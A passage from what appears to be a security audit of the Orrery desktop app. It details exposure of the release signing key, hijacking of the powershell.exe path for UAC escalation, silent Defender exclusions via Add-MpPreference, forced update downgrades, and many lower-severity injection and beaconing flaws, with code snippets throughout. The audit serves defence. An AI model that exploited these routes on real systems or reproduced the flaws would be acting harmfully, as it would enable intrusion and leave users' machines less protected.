**Fix.** Decouple building from signing: run `pnpm tauri build` with no signing secrets in the environment, then sign the produced bundles in a separate step (or a separate job that downloads the artifacts) whose only command is the minisign/tauri signer, so the key is present for one invocation that runs no dependency code. Longer term, move signing behind a GitHub `environment:` with a required reviewer, and document a pubkey-rotation plan given tauri.conf.json:50 pins every installed client to this one key.

### 32. The minisign signing key is present in the environment while `pnpm tauri build` executes every dependency's build script — cargo build.rs runs unconditionally, outside pnpm's postinstall allowlist

`.github/workflows/release.yml:115` — supply-chain _(added by verifier)_

**Actor.** T5 · **Precondition.** A compromised release of any crates.io crate in the src-tauri dependency graph that carries a build.rs (or any transitive @angular/esbuild build-time plugin), landing in a version the lockfile resolves to on the next release build.

**Impact.** Exfiltration of TAURI_SIGNING_PRIVATE_KEY and its password — the single root of trust for every installed copy (its public half is baked in at tauri.conf.json:50 and the endpoint at tauri.conf.json:48), with no revocation path for already-installed users. Distinct from finding -03, which covers only the `uses:` actions: SHA-pinning every action does not close this, because the exposure is the build itself.

**How it breaks.** release.yml:111-115 puts the key and its password in the environment of a single step, `run: pnpm tauri build`, which drives both the Angular build and `cargo build` for src-tauri. Cargo executes the build.rs of every crate in the graph as native code with the full step environment, and there is no cargo equivalent of pnpm's allowlist. The repo does harden the npm side — pnpm-workspace.yaml `allowBuilds` limits install scripts to four packages ('@parcel/watcher', esbuild, lmdb, msgpackr-extract) — but nothing constrains cargo, and even on the npm side the Angular build's own plugin code runs in-process during `ng build`. The workspace is shared with the staging copies at release.yml:120-126, so the same code can also rewrite src-tauri/target/release/bundle/** after signing.

  ```
  release.yml:111-115 —
        - name: Build Tauri app with signed updater artifacts
          env:
            TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
            TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
          run: pnpm tauri build
  
  pnpm-workspace.yaml —
  # pnpm blocks dependency build/postinstall scripts by default (supply-chain
  # safety). These trusted native deps are explicitly allowed to run their install
  # scripts.
  allowBuilds:
    '@parcel/watcher': true
    esbuild: true
    lmdb: true
    msgpackr-extract: true
  ```

**Fix.** Split signing out of the build: have the matrix job produce an UNSIGNED bundle and upload it as an artifact, then sign in a separate minimal job whose only steps are download-artifact, the tauri signer, and upload — no pnpm install, no cargo, no third-party build code sharing the key's environment. If that is too invasive for now, at least vendor/lock the Rust graph (`cargo vendor` + `--offline`) so a newly published crate cannot enter the signing job.

### 33. The UAC-elevated Defender step launches `powershell.exe` by bare name, which resolves against the user-writable per-user install directory before System32

`src-tauri/src/defender.rs:154-168` — privilege-elevation _(downgraded on verification)_

**Actor.** T1 · **Precondition.** Windows. The app was started from its Start-menu or desktop shortcut (WorkingDirectory=INSTALLDIR, wix/main.wxs:135 and :221), so its CWD is %LOCALAPPDATA%\Programs\Orrery — a directory writable without any privilege. An agent (or anything else running as the user) drops a file named `powershell.exe` there. The Defender step then has to run: first launch, a new app version after a declined/failed prompt, or a changed worktree root (defender.rs:51-57). The user accepts the UAC prompt — which this design deliberately produces 3 seconds after startup (defender.rs:207) with nothing in the UI explaining it.

**Impact.** Local privilege escalation from the user's own token to full administrator. This is the only elevation boundary the app crosses, and it is crossed with an unqualified program name resolved against a directory the attacker controls.

**How it breaks.** defender.rs:154 spawns the outer shell as `crate::core::proc::cmd("powershell.exe")`. Rust's Windows program resolution searches the directory containing the current executable before the system directory (the current directory is deliberately excluded), and CreateProcessW's own order does the same. Orrery.exe lives in %LOCALAPPDATA%\Programs\Orrery — writable without privilege because wix/main.wxs:49-50 makes the package `InstallScope="perUser" InstallPrivileges="limited"` and main.wxs:102 redirects INSTALLDIR there (NSIS defaults to currentUser; tauri.windows.conf.json sets no installMode). An attacker who drops powershell.exe there owns the outer shell of the only elevation flow in the app: it holds the `-Command <launcher>` payload but can instead call Start-Process -Verb RunAs on the genuine System32 powershell.exe with its own EncodedCommand, producing a Microsoft-signed UAC dialog at exactly the moment (3 s after startup, defender.rs:207) this design has taught the user to accept one. Escalation completes only if the user consents. The same bare-name pattern at updater-stub/src/main.rs:113 (`Command::new("notepad.exe")`, resolved against %TEMP% where the stub runs) is the unelevated sibling.

  ```
  123:           $p = Start-Process -FilePath 'powershell.exe' -Verb RunAs -Wait -PassThru -WindowStyle Hidden \
  124:             -ArgumentList @('-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand','{encoded}'); \
  -- defender.rs:154 --
  154:    let out = crate::core::proc::cmd("powershell.exe")
  -- wix/main.wxs:102 / :221 --
  102: <SetProperty Id="INSTALLDIR" Value="[LocalAppDataFolder]Programs\\{{product_name}}" ...>
  221:                    WorkingDirectory="INSTALLDIR">
  ```

**Fix.** Build the absolute path from the SystemRoot environment variable — %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe — for the `cmd(...)` call at defender.rs:154 and for `-FilePath` at defender.rs:123, so neither the app directory nor PATH participates in resolution.

<sub>Verifier: The conclusion survives but the cited mechanism is wrong, and the impact is bounded by UAC consent. Wrong: the finding blames the process CWD and ShellExecuteEx. `crate::core::proc::cmd` (core/proc.rs:33-42) never calls current_dir, but Rust's std Command on Windows resolves a bare program name with `search_paths`, which deliberately SKIPS the current directory (it was removed as a security hazard) — so the shortcut's WorkingDirectory=INSTALLDIR (wix/main.wxs:135, :221) is not the lever. Nor is the inner `Start-Process -FilePath 'powershell.exe'` (defender.rs:123): Start-Process resolves FilePath through PowerShell command discovery, which does not search the current directory (the well-known reason `.\prog.exe` is required in PowerShell). What DOES hold: std's search order checks the directory of the current executable before the system directory, so `crate::core::proc::cmd("powershell.exe")` at defender.rs:154 resolves %LOCALAPPDATA%\Programs\Orrery\powershell.exe ahead of System32 — and that directory is user-writable because the package is per-user (wix/main.wxs:49-50 InstallScope=perUser/InstallPrivileges=limited, main.wxs:102 INSTALLDIR=[LocalAppDataFolder]Programs\Orrery). CreateProcessW's own search order also puts the application directory first, so the finding holds under either implementation. The attacker's binary runs UNELEVATED as the outer shell; it gains admin only by then calling ShellExecute RunAs on the real System32 powershell.exe and having the user accept the UAC prompt that defender.rs:207 has trained them to expect 3 s after launch. That is genuine but consent-gated, and it presupposes INSTALLDIR write access, i.e. an actor who is already running as the user. Medium, not high. Note defender.rs:154 is the ONLY bare-name spawn on the elevation path (git/backend.rs:192-222 `cmd("git")`, cost/mod.rs:152 `cmd("cmd")`, cost/mod.rs:165 `cmd("npx")` are the same pattern but never elevate).</sub>

### 34. The path handed to Add-MpPreference is an unvalidated user-picked directory — a drive root or profile folder silently disables Defender for everything under it

`src-tauri/src/defender.rs:175-179` — input-validation

**Actor.** T1 · **Precondition.** The user points Settings → worktree root at a broad directory using the native folder picker (settings-modal.component.ts:1091-1092) — `C:\`, `C:\Users\<name>`, their OneDrive or Documents folder are all one click away and none is an unreasonable choice for someone who wants worktrees next to their other code. Then the UAC prompt is accepted.

**Impact.** Real-time protection is turned off for the user's whole profile or the whole system drive, permanently and machine-wide, as a side effect of a setting whose UI says nothing about Defender. Combined with finding -04 (nothing ever removes it) this is a durable, silent removal of the host's primary malware defence — and it is what makes -04 dangerous well beyond the agent sandbox.

**How it breaks.** effective_root (defender.rs:175-179) hands `agents.worktree_root_effective()` unfiltered to script(), which interpolates it into `Add-MpPreference -ExclusionPath '{quoted}'` (defender.rs:90) — a recursive, machine-wide exclusion. The only validation is agents/service.rs:74-89: non-empty, absolute (service.rs:80), creatable (service.rs:84). `C:\` and `C:\Users\alice` pass all three and are excluded verbatim; there is no minimum depth, no containment to app data, and no display of the path before the UAC prompt. (Wildcard roots are not reachable: an uncreatable path falls back to the default at service.rs:85-87.)

  ```
  175: fn effective_root(agents: &AgentService) -> String {
  176:     let root = agents.worktree_root_effective();
  177:     let _ = std::fs::create_dir_all(&root); // the exclusion should name a real folder
  178:     root.to_string_lossy().to_string()
  179: }
  -- agents/service.rs:80-88 (the only validation) --
   80:         if !p.is_absolute() {
   84:         if let Err(e) = std::fs::create_dir_all(&p) {
  ```

**Fix.** Reject drive roots, the user profile root, and any path shallower than a minimum depth or outside a known-good set before elevating, and show the exact directory in a consent dialog first.

<sub>Verifier: The core claim holds: effective_root (defender.rs:175-179) passes `worktree_root_effective()` straight into script() and thence into `Add-MpPreference -ExclusionPath` (defender.rs:90), and the only upstream validation is effective_worktree_root (agents/service.rs:74-89) — non-empty, `is_absolute()` (service.rs:80), and `create_dir_all` succeeds (service.rs:84). `C:\` and `C:\Users\<name>` satisfy all three verbatim, and settings-modal.component.ts:1091-1092 sets worktreeRoot from a native folder picker with no constraint, while the UI (settings-modal.component.ts:375-379) shows only the path and never mentions Defender. One sub-claim is REFUTED: the parenthetical about wildcard roots. A path containing `*` is not creatable on Windows, so `create_dir_all` fails at service.rs:84-87 and the function returns `self.worktree_root` (the app-data default) — the original string never reaches Add-MpPreference. The `let _ =` at defender.rs:177 is a second, redundant create_dir_all on an already-validated path, not a swallow of the first. Severity stays medium: it needs the user to pick a broad root (the default is empty → app-data\worktrees), but if they do, the consequence is permanent and silent, and it is what gives finding -04 reach beyond the agent sandbox.</sub>

### 35. Defender real-time scanning is permanently disabled for the entire worktree tree, with no opt-out, no disclosure, and no removal on uninstall

`src-tauri/src/defender.rs:200-222` — privilege-elevation

**Actor.** T1 · **Precondition.** Windows with Defender as the active real-time scanner; the user accepted the unexplained UAC prompt once. After that the record's state is "applied" and the app never revisits it for that root (defender.rs:54).

**Impact.** The one directory tree that by design receives arbitrary code from four different agent CLIs and from every repository the user clones is permanently exempt from real-time AV scanning, machine-wide. A payload dropped there by a prompt-injected agent, a hostile repo's build script, or a malicious npm/cargo postinstall is never scanned — including later, when the user themselves double-clicks it or copies it elsewhere. The exclusion survives uninstalling Orrery, so the weakening is permanent and invisible.

**How it breaks.** `ensure_on_startup` is called unconditionally from lib.rs:143; there is no `defender`/`exclusion` key anywhere in src-tauri/src/settings/model.rs or the frontend settings store, so the user cannot decline it durably — declining the UAC prompt only sets state "declined", which is retried on the next app version (defender.rs:51-57, and the test at defender.rs:253-264 pins that behaviour). The elevated script at defender.rs:90 runs `Add-MpPreference -ExclusionPath '<root>'`, a path exclusion that covers the whole subtree recursively and is stored in machine-wide Defender preferences. Grepping the repo for `Remove-MpPreference` returns nothing: neither the WiX template (src-tauri/wix/main.wxs) nor any uninstall hook ever reverses it, and nothing in the UI ever tells the user the exclusion exists. The prompt itself is a generic UAC dialog for `powershell.exe` fired 3 s after launch (defender.rs:207, 123-124 `-WindowStyle Hidden`), so the user is asked to grant admin for an operation they are given no description of.

  ```
  200: pub fn ensure_on_startup(agents: AgentService, settings: SettingsService, version: String) {
  201:     if !cfg!(windows) {
  207:             std::thread::sleep(std::time::Duration::from_secs(3));
  210:             if !should_run(record.as_ref(), &root, &version) {
  -- defender.rs:90 (the elevated script) --
   90:         Add-MpPreference -ExclusionPath '{quoted}'\n\
  ```

**Fix.** Add a settings toggle plus a pre-elevation dialog naming the exact folder and the trade-off; treat `declined` as final rather than retrying per app version (defender.rs:55); and run `Remove-MpPreference -ExclusionPath` when the toggle is turned off, when the root moves, and from a WiX uninstall custom action.

<sub>Verifier: All claims verified. `defender::ensure_on_startup` is called unconditionally from lib.rs:143; defender.rs:200-215 sleeps 3 s and runs the elevated step whenever should_run says so. `should_run` (defender.rs:51-57) keeps `applied` sticky per root but re-runs `declined`/`failed`/`unsupported` on every new app version — pinned by the tests at defender.rs:253-264 — so a user cannot decline durably. The elevated script at defender.rs:90 is `Add-MpPreference -ExclusionPath '{quoted}'`, a recursive, machine-wide preference. A repo-wide grep for `Remove-MpPreference` returns nothing, and src-tauri/wix/main.wxs has no uninstall custom action for it, so the exclusion outlives uninstall. The only persistence is the KV record (settings/service.rs:179-186 shows `defender_exclusion` is an app KV key, not a user preference), and there is no defender/exclusion key in the settings model or the frontend store, so no toggle exists. This is not covered by the stated trade-offs: the module doc (defender.rs:1-21) justifies why the exclusion and the UAC prompt exist, but says nothing about never removing it or offering no opt-out. Medium is right — the impact is a permanently weakened host AV posture, not direct code execution.</sub>

### 36. latest.json is unsigned: version, notes and the url→signature pairing sit outside the minisign signature, so manifest tampering forces a downgrade to any previously signed build

`src-tauri/tauri.conf.json:46-51` — crypto-integrity

**Actor.** T4 · **Precondition.** An attacker who can alter what the client reads from the manifest endpoint: compromise of the RELEASES_TOKEN that publishes to kouji-dev/orrery-releases (release.yml:174), takeover of that public repo, or a TLS-terminating position between the client and github.com / objects.githubusercontent.com.

**Impact.** Forced downgrade to any release ever signed with the project key — the .sig for an old installer still verifies, so a manifest claiming `"version": "99.0.0"` while pointing `url` at v0.1.0's installer installs that old build silently and passes every check. Any vulnerability fixed in the update history becomes re-exploitable on demand. The attacker also chooses the download host: `url` is taken from the manifest with no origin restriction, so the installer can be served from anywhere as long as the bytes match a signature the project once produced.

**How it breaks.** The minisign pubkey at tauri.conf.json:50 covers only the installer payload. make-latest-json.mjs:19 pairs an unauthenticated `url` with a signature read from a sibling .sig (make-latest-json.mjs:51-57); make-latest-json.mjs:24-30 adds unsigned `version`, `notes` and `pub_date`; release.yml:169 and :181 publish the file as a plain release asset. An actor who can rewrite that asset — RELEASES_TOKEN compromise (release.yml:174/:200) or takeover of the public releases repo — sets `version` to anything, points `url` at any host, and supplies the matching old `.sig`; the client (update.rs:71-81, 93, 142) verifies the bytes, sees a higher version string, and silently installs the old build. Not reachable by a network attacker: the endpoint is https with no insecure-transport opt-out.

  ```
  46:    "updater": {
  47:      "endpoints": [
  48:        "https://github.com/kouji-dev/orrery-releases/releases/latest/download/latest.json"
  49:      ],
  50:      "pubkey": "dW50cnVzdGVkIGNvbW1lbnQ6..."
  -- scripts/release/make-latest-json.mjs:19 --
  19:    platforms[key] = { signature, url: assetUrl(repo, tag, file) };
  ```

**Fix.** Publish a detached minisign signature over latest.json itself and verify it before acting on any field, and record a monotonic version floor on disk so the client refuses a payload whose embedded product version is lower than the installed one even when the manifest claims otherwise.

<sub>Verifier: Mechanism verified: make-latest-json.mjs:19 emits `platforms[key] = { signature, url: assetUrl(...) }` where the signature is read from the sibling .sig (make-latest-json.mjs:51-57) and the url is a plain string (make-latest-json.mjs:5-7); buildLatestJson (make-latest-json.mjs:24-30) adds version/notes/pub_date, none of which is signed, and release.yml:164-181 uploads latest.json as an ordinary release asset. tauri.conf.json:46-51 confirms the single endpoint and the pubkey, and Tauri's plugin gates only on version-greater-than-current using the attacker-supplied field, with no origin restriction on `url` and no floor on the installed version. ACTOR CORRECTED: the finding lists T4 'a TLS-terminating position between the client and github.com'. That is not realistic — the endpoint is https (tauri.conf.json:48) with no `dangerousInsecureTransportProtocol` anywhere in the config, so cert validation applies and a network attacker has no position. The credible precondition is T5: compromise of RELEASES_TOKEN (release.yml:174, :200) or takeover of the public kouji-dev/orrery-releases repo. With that, forced downgrade to any build ever signed with this key is real, since old .sig files still verify. Also worth noting this is upstream Tauri updater behaviour (the manifest is unsigned by design), which caps what the app can fix short of the rollback floor. Medium stands.</sub>


## Low (58)

One line each; full detail is in `.audit-work/pass2-merged.json`.

- `.github/workflows/test.yml:1` **test.yml declares no `permissions:` block and pins its third-party action to a mutable tag, so a dev-dependency compromise gets whatever the repo default token grants** — test.yml has no `permissions:` key anywhere (the whole file is 14 lines: name, on, jobs.test.runs-on, and five steps), unlike release.yml which sets `permissions: contents: write` at line 31-32 and publish-changelog.yml which sets it at its own top level. _(added by verifier)_
- `landing/index.html:71` **Landing page loads Google's gtag.js with no CSP and no SRI on the same page that hands visitors unsigned installer download links** — landing/index.html:71 is `<script async src="https://www.googletagmanager.com/gtag/js?id=G-XJLNTCMR4P"></script>` — a third-party origin, no `integrity` attribute (SRI is not applicable to gtag anyway, since the payload is dynamic). _(added by verifier)_
- `package.json:56` **monaco-editor 0.55.1 vendors DOMPurify 3.2.7 into the desktop bundle (18 advisories) — no attacker-controlled markup reaches it; the reachable sanitizer is mermaid's patched 3.4.13** — monaco-editor 0.55.1 vendors DOMPurify into its ESM tree at esm/vs/base/browser/dompurify/dompurify.js (license header: `DOMPurify 3.2.7`).
- `package.json:61` **browserslist / postcss / nanoid / immutable / fast-uri advisories are @angular/build build-time code, invoked only on this repo's own sources** — All rows carry `.>@angular/build>…` paths and @angular/build is a devDependency (package.json:61), so none of these packages is bundled into dist/orrery/browser or the Tauri binary.
- `package.json:62` **20 hono / express / body-parser / qs / ip-address advisories come from @angular/cli's bundled @modelcontextprotocol/sdk — dev-only and only live if `ng mcp` is run** — Every one of these rows has the path prefix `.>@angular/cli>@modelcontextprotocol/sdk>…` and @angular/cli is a devDependency (package.json:62).
- `package.json:67` **All 10 undici advisories reach the tree only through jsdom, a vitest-only devDependency — not shipped** — Every undici row in the audit has the path `.>jsdom>undici` and jsdom is declared under devDependencies (package.json:67), so it is consumed by `pnpm test` (vitest) and never by `ng build`'s output.
- `pnpm-workspace.yaml:16-19` **`minimumReleaseAgeExclude` is configured but `minimumReleaseAge` itself is set nowhere in the repo — the quarantine it documents is not actually in force for anyone who clones** — pnpm-workspace.yaml:16-19 excludes '@kouji-ui/components', '@kouji-ui/core' and '@kouji-ui/themes' from "the minimum-release-age rule", but `grep -rn minimumReleaseAge` over the repo (excluding node_modules/.git) matches only that exclude key — `minimumReleaseAge` itself is set nowhere, and there is no `.npmrc` at the repo root (the file does not exist).
- `src-tauri/Cargo.lock:1` **Unmaintained gtk3-rs bindings and the anyhow / event-listener / glib unsoundness warnings carry no exploitable path in the shipped Windows+macOS builds** — cargo-audit reports 14 `unmaintained` warnings dominated by the GTK3 binding family plus proc-macro-error, serial and the unic-* crates, and 3 `unsound` warnings (anyhow 1.0.102, event-listener 5.4.1, glib 0.18.5).
- `src-tauri/Cargo.lock:868-874` **crossbeam-epoch 0.9.18 (RUSTSEC-2026-0204) is compiled into the desktop binary but the vulnerable formatting impl is never invoked** — crossbeam-epoch 0.9.18 enters the graph as crossbeam-deque's dependency, and crossbeam-deque is pulled by `ignore` (the file walker used for the project tree / search) and `gix-pack` (git object database), both first-party runtime dependencies (Cargo.toml:44, Cargo.toml:37-43).
- `src-tauri/Cargo.lock:4649-4665` **quick-xml 0.37.5 and 0.39.4 (RUSTSEC-2026-0194/-0195, parser DoS) ship transitively via tauri's plist (0.39.4) and the Windows toast notifier (0.37.5); no untrusted XML is parsed** — Two copies land in src-tauri/Cargo.lock: 0.39.4 (line 4659) as a dependency of `plist` (declared at 4425, dep line 4432), which is itself pulled by tauri / tauri-utils / tauri-codegen / tauri-plugin; and 0.37.5 (line 4650) as a dependency of `tauri-winrt-notification` (declared at 6175, dep line 6180) <- notify-rust <- tauri-plugin-notification (src-tauri/Cargo.toml:53).
- `src-tauri/Cargo.lock:4915-4918` **rkyv 0.7.46 (RUSTSEC-2026-0235) appears in Cargo.lock via an optional rust_decimal feature that is almost certainly not activated** — rkyv enters only as a dependency line of `rust_decimal 1.42.0`, which is pulled by `byte-unit` <- `tauri-plugin-log` (Cargo.toml:33).
- `src-tauri/src/cost/mod.rs:153-168` **Dormant code path shells out to `npx ccusage` with no version pin — a live RCE surface the moment the cost kill switch is flipped** — `run_ccusage()` builds `cmd /C npx ccusage daily --json` (mod.rs:153) or `npx ccusage daily --json` (mod.rs:165-166) with a bare package name — no version, no integrity hash, no `--no-install`.
- `src/app/workspace/file-view.component.ts:101` **Remote <img> in agent- or repo-authored markdown and ticket notes loads unrestricted, giving a read-receipt/IP beacon** — marked emits <img src="https://attacker/…"> from a repo- or agent-authored .md; Angular's sanitizer keeps the element and accepts the https scheme; the [innerHTML] binding at file-view.component.ts:101 inserts it and the webview fetches it immediately.
- `src/app/workspace/md-mermaid.ts:64` **Mermaid diagram output is injected with raw innerHTML, deliberately bypassing Angular's sanitizer, leaving DOMPurify as the single barrier on fully attacker-controlled input** — The module's own header comment states the reason for the bypass: 'Angular's [innerHTML] sanitizer would strip mermaid's SVG output (style elements, foreignObject), so diagrams are rendered by post-processing the live preview DOM' (md-mermaid.ts:5-7).
- `src/app/workspace/monaco-loader.ts:39-41` **Shipped bundle contains monaco-editor's vendored DOMPurify 3.2.7 with a stack of known bypass advisories; an npm override will not fix it** — loadMonaco dynamically imports monaco-editor/esm/vs/editor/edcore.main.js, which pulls in vs/base/browser/markdownRenderer.js → vs/base/browser/domSanitize.js → vs/base/browser/dompurify/dompurify.js.
- `src/index.html:10-13` **Google Fonts are fetched over the network at build time with no pinning, and the shipped app still beacons fonts.gstatic.com on every launch** — Production builds inline the fonts.googleapis.com CSS at build time (Angular optimization.fonts.inline defaults to true and angular.json's production config does not disable it), so the runtime stylesheet-substitution attack does not apply to a release build — but the inlining itself is an unpinned network fetch performed by the CI runner, and the resulting @font-face rules still request woff2 files from fonts.gstatic.com at every launch, which is an unavoidable third-party callout from a desktop app and a silent failure mode offline.
- `src-tauri/src/core/commands.rs:32-36` **open_path / reveal_path are registered IPC commands taking an arbitrary absolute path, bypassing os_target's guard** — `file_open_external` carefully resolves through `safe_join` and existence-checks before handing off (`fs_commands.rs:245-251, 266-268`), but the underlying `open_path`/`reveal_path` are themselves `#[tauri::command]` and registered in the invoke handler (src-tauri/src/lib.rs:368-369), so the guarded wrapper is optional from the frontend's point of view.
- `src-tauri/src/fs/mod.rs:47-51` **fs::list_dir joins a caller-supplied relative path with no guard, unlike every sibling worktree command** — `scan` computes `workdir.join(rel)` and calls `read_dir` with no component check.
- `src-tauri/src/git/backend.rs:213` **Remote name from the repo's config is passed to `git fetch` as a bare argv with no `--` separator (option injection)** — `cmd.args(["fetch", "--prune", r])` places `r` where git's parse-options still accepts flags; there is no `--` terminator and no validation that `r` matches an existing remote name or `^[A-Za-z0-9._/-]+$`.
- `src-tauri/src/git/gix_backend.rs:1567-1596` **Discard with an empty pathspec deletes every untracked non-ignored file, from an unconfirmed one-click action** — `pathspec_matches` returns `true` for everything when `specs.is_empty()` (gix_backend.rs:1256-1262), so `discard(worktree, &[])` selects every status entry: `"A"` (untracked) entries go to `delete_path` and the rest are force-restored from HEAD.
- `src-tauri/src/git/service.rs:59-63` **Startup trash sweep recursively deletes any directory whose name merely *contains* ".trash-", under a user-configurable root** — `is_trash_dir` uses `n.contains(TRASH_MARKER)` rather than matching the exact `<base>.trash-<6 hex>` shape `trash_path` produces (service.rs:49-56), so `backup.trash-2023-archive` qualifies.
- `src-tauri/src/cli/hook.rs:59-63` **hook_command interpolates the executable path into a POSIX sh string with no escaping of $, backtick or double quote** — hook_command only replaces backslashes with forward slashes (cli/hook.rs:60) and then formats the path into two double-quoted positions (cli/hook.rs:62).
- `src-tauri/src/cli/hook.rs:126-140` **ORRERY_ENDPOINT is not constrained to loopback: the globally installed hook will POST the token and full hook payload to any host, and prints that server's response as the hook's decision** — should_broker only checks that the three strings are non-empty (cli/hook.rs:70-72) — it never checks that the endpoint is 127.0.0.1/::1.
- `src-tauri/src/hooks/mod.rs:114-116` **Bridge dedup maps are keyed by the attacker-supplied agentId and never evicted, and the persisted session_id is unbounded in length** — last_activity/last_status/last_session are created once (hooks/mod.rs:114-116) and only ever inserted into, keyed by env.agent_id, which is a free-form string from the request body (hooks/mod.rs:209, 329, 468).
- `src-tauri/src/hooks/mod.rs:120` **Acceptor thread has no error handling: an accept error spins it hot, and a failed thread spawn kills hook reception for the rest of the app's life** — hooks/mod.rs:119-138 is the whole acceptor: `for stream in listener.incoming().flatten() { … std::thread::spawn(move || { handle(…) }); }`. _(added by verifier)_
- `src-tauri/src/hooks/mod.rs:199-213` **session_id from an untrusted hook payload is persisted unvalidated and later used verbatim as the `claude --resume` argv value** — handle() takes payload.session_id as any JSON string (hooks/mod.rs:199-206) and passes it to on_session -> AgentService::set_session, which writes it to the agents row with no length, charset, or UUID validation (agents/service.rs:536-544).
- `src-tauri/src/hooks/mod.rs:230` **Every permission/notification hook payload is written to the on-disk log file, including the full shell command being approved** — hooks/mod.rs:222-237 fires for exactly the two variants that carry the approval text (`AgentEvent::PermissionRequest | AgentEvent::Notification`), stringifies `env.payload` (the whole untruncated hook body from the agent), clips it to 500 chars, and logs it at debug. _(added by verifier)_
- `src-tauri/src/hooks/protocol.rs:688-712` **HTTP/auth parsing is lenient: request line discarded, repeated "Bearer " prefixes stripped, token compared in variable time** — read_request reads and discards the request line (protocol.rs:688), so method, path and HTTP version are never validated and there is no Host check.
- `src-tauri/src/hooks/transcript.rs:41-204` **transcript_path is opened verbatim from the hook payload — a FIFO pins a connection thread forever and a character device makes read_to_end allocate without bound** — latest_content takes payload.transcript_path as a plain string with no canonicalisation, no worktree containment check, and no file-type check (transcript.rs:40-47), and read_tail File::opens it (transcript.rs:194-195).
- `src-tauri/capabilities/default.json:9-18` **Capability set grants plugin permissions the frontend never uses (updater, log)** — The capability file lists `updater:default` and `log:default`, but grep over src/app shows no import of @tauri-apps/plugin-updater (only plugin-process `relaunch` at updater/tauri-updater.ts:4) and no plugin-log usage at all — the log plugin is configured Rust-side (core/logger.rs) with Stdout/Webview/LogDir targets, none of which need the JS command.
- `src-tauri/src/agents/commands.rs:388-446` **tauri.conf.json ships `"csp": null`, so the webview has no script-source restriction behind a very powerful invoke surface** — tauri.conf.json:24 disables Tauri's CSP injection and src/index.html:8-13 loads a remote stylesheet, so nothing constrains script or connect sources in the window that can invoke shell_start (agents/commands.rs:398-399) and agent_input (agents/commands.rs:440-443).
- `src-tauri/src/agents/commands.rs:961-969` **verify_tool_path executes an arbitrary caller-supplied path with no confirmation** — verify_tool_path takes `id: String` and `path: String` from the payload and calls detect_at, which for a known adapter probes that exact path and for an unknown id calls run_probe(path, ["--version"]) directly (adapters/mod.rs:373-380).
- `src-tauri/src/core/commands.rs:36-48` **open_path / reveal_path expose an unscoped 'launch any path with the OS handler' primitive that the capability file never grants** — capabilities/default.json:11 grants only `opener:default`, which covers open-url and reveal-item-in-dir with the plugin's URL scope; `opener:allow-open-path` is not granted.
- `src-tauri/src/git/backend.rs:213-217` **project_fetch passes a free-form `remote` positionally to the git CLI (option injection)** — project_fetch (git/branches.rs:52-67) takes `remote: Option<String>` from the payload and hands it to GitBackend::fetch, which appends it as the third element of `["fetch","--prune", r]` with no `--` separator and no allowlist check against the repo's configured remotes.
- `src-tauri/src/settings/commands.rs:16-24` **settings_set persists the whole document with no validation, including the agent permission-bypass flag and the launched executable path** — settings_set deserializes a full `Settings` (all fields `#[serde(default)]`) and calls svc.set with no field validation — no enum check on channel/updatePolicy/autoApprove, no path check on toolPaths/worktreeRoot.
- `landing/index.html:81` **Google Fonts loaded render-blocking from fonts.googleapis.com/gstatic.com on every page — a second undisclosed transfer of visitor IP to Google that no GA consent gate would cover** — An EU visitor opens orrery.kouji.dev. _(added by verifier)_
- `landing/index.html:466` **Five public CTAs, the JSON-LD sameAs and llms.txt point at github.com/kouji-dev/orrery, which the codebase states is a private repo — every visitor and every AI crawler following them gets a 404** — A visitor evaluating whether to run the unsigned installer clicks 'GitHub' at index.html:466 (or :358, :367, :390) to inspect the source before trusting the binary. _(added by verifier)_
- `landing/version.js:72-80` **Installer URL is taken from remote JSON and from a persisted localStorage cache with no scheme or host allow-listing** — An attacker who can answer the api.github.com request (or who already has script on the origin) returns a release object whose first asset matching /-setup\.exe$/i has browser_download_url set to their own host, or to `javascript:...`.
- `landing/version.js:90-109` **Two unauthenticated api.github.com calls per page view, the second never cache-gated — visitor IP disclosed to a third party on every load and the shared rate limit is burned** — A visitor behind a shared NAT loads the page; the 60/hour unauthenticated budget for that IP is already spent by unrelated traffic, so both fetches return 403.
- `render.yaml:21-30` **landing/README.md is inside the published static root and is served publicly; buildFilter.ignoredPaths gates builds, not publication** — A visitor or crawler requests /README.md and receives the maintenance notes verbatim.
- `render.yaml:34-46` **No CSP, frame-ancestors/X-Frame-Options or Permissions-Policy on the download origin — the download CTA can be framed and any injection is uncontained** — With no frame-ancestors/X-Frame-Options, an attacker page embeds orrery.kouji.dev in an invisible iframe and overlays its own UI so the visitor's click lands on the real .js-dl CTA (or, inverted, on the attacker's own installer link) — a straightforward clickjack of the one action the site exists to produce.
- `src/app/updater/changelog.service.ts:52-53` **Desktop app casts remote changelog.json to a typed array with no shape validation; a malformed entry throws inside the What's New modal** — An actor who can commit to orrery-releases writes an entry like {"tag":"v9.9.9","commits":5}.
- `.github/workflows/release.yml:31-32` **`contents: write` inherited workflow-wide; build/publish jobs keep a write-scoped token they do not need** — release.yml:31-32 sets `permissions: contents: write` at workflow level, so all four jobs inherit it.
- `.github/workflows/release.yml:64` **`github.ref_name` is interpolated into a shell command, so a crafted tag name executes code in the release pipeline** — release.yml:64 embeds `${{ github.ref_name }}` inside a double-quoted shell assignment. _(added by verifier)_
- `.github/workflows/release.yml:205` **RELEASES_TOKEN embedded in clone URLs and persisted to .git/config; workflows holding it are dispatchable from any branch** — release.yml:205 and publish-changelog.yml:52 both run `git clone --depth 1 "https://x-access-token:${RELEASES_TOKEN}@github.com/kouji-dev/orrery-releases.git" releases-repo`.
- `.github/workflows/test.yml:1-15` **test.yml and deploy-landing.yml declare no `permissions:`, leaving the CI token scope to an invisible repo setting** — test.yml:4 triggers on every pull_request with no branch filter and no `permissions:` key, so the job takes the repository default.
- `landing/changelog.html:196` **Unescaped `channel` from remote changelog.json interpolated into a class attribute on the landing changelog page** — changelog.html:210 fetches changelog.json from raw.githubusercontent.com and changelog.html:196 builds `'<span class="rel-badge '+r.channel+'">'` with no escaping; `esc` (changelog.html:176) is only applied to tag/date/ref/summary/scope/hash/msg and in any case only replaces & < > , not quotes.
